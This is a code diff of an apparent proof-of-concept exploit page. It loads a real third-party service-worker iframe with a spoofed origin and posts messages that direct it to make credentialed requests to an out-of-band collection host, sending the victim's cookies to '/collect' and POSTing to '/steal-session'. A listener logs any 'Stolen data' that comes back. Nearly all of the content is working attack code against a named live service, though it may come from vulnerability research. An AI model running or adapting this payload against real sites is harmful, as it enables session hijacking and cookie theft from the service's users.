@@ -8,48 +8,62 @@
   <!-- <iframe id="targetFrame" src="https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=http://127.0.0.1&path=badr" style="width:100%; height:500px;"></iframe> -->
 
   <script>
-    // 1. Create iframe with spoofed origin
+
+        // 1. Create iframe with spoofed origin
         const iframe = document.createElement('iframe');
         iframe.src = 'https://tagging.wetransfer.com/_/service_worker/5230/sw_iframe.html?origin=https://daemoon.me';
         document.body.appendChild(iframe);
 
         iframe.onload = () => {
-        // 2. Send command to exfiltrate data
-        iframe.contentWindow.postMessage({
-            type: 1,
-            clientId: 'attacker-client',
-            command: {
-            commandType: 0,
-            params: {
-                url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/collect?cookies=${document.cookie|encode}',
-                method: 0,
-                credentials: 'include',  
-                templates: {},
-                processResponse: false
+            try {
+                console.debug('[DEBUG] iframe loaded:', iframe.src);
+                // 2. Send command to exfiltrate data
+                const collectUrl = `https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/collect?cookies=${encodeURIComponent(document.cookie)}`;
+                const collectMsg = {
+                    type: 1,
+                    clientId: 'attacker-client',
+                    command: {
+                        commandType: 0,
+                        params: {
+                            url: collectUrl,
+                            method: 0,
+                            credentials: 'include',
+                            templates: {},
+                            processResponse: false
+                        }
+                    }
+                };
+                console.debug('[DEBUG] Sending collect message:', collectMsg);
+                iframe.contentWindow.postMessage(collectMsg, '*');
+
+                // 3. Or send tracking request with victim's cookies
+                const stealMsg = {
+                    type: 1,
+                    clientId: 'attacker-client',
+                    command: {
+                        commandType: 0,
+                        params: {
+                            url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/steal-session',
+                            method: 1, // POST
+                            body: 'victim_data=sensitive',
+                            credentials: 'include'
+                        }
+                    }
+                };
+                console.debug('[DEBUG] Sending steal message:', stealMsg);
+                iframe.contentWindow.postMessage(stealMsg, '*');
+            } catch (err) {
+                console.error('[ERROR] Failed to send postMessage:', err);
             }
-            }
-        }, '*');
-        
-        // 3. Or send tracking request with victim's cookies
-        iframe.contentWindow.postMessage({
-            type: 1,
-            clientId: 'attacker-client',
-            command: {
-            commandType: 0,
-            params: {
-                url: 'https://y9ozrc2di0vg4ccu7kgz1z84r5x4nvo6v.oast.site/steal-session',
-                method: 1,  // POST
-                body: 'victim_data=sensitive',
-                credentials: 'include'  
-            }
-            }
-        }, '*');
         };
 
         // 4. Listen for responses
         window.addEventListener('message', (e) => {
+            console.debug('[DEBUG] Received message event:', e);
             if (e.origin !== 'https://tagging.wetransfer.com') {
-                console.log('Stolen data:', e.data);
+                console.log('[INFO] Stolen data:', e.data);
+            } else {
+                console.log('[INFO] Message from trusted origin:', e.data);
             }
         });
 
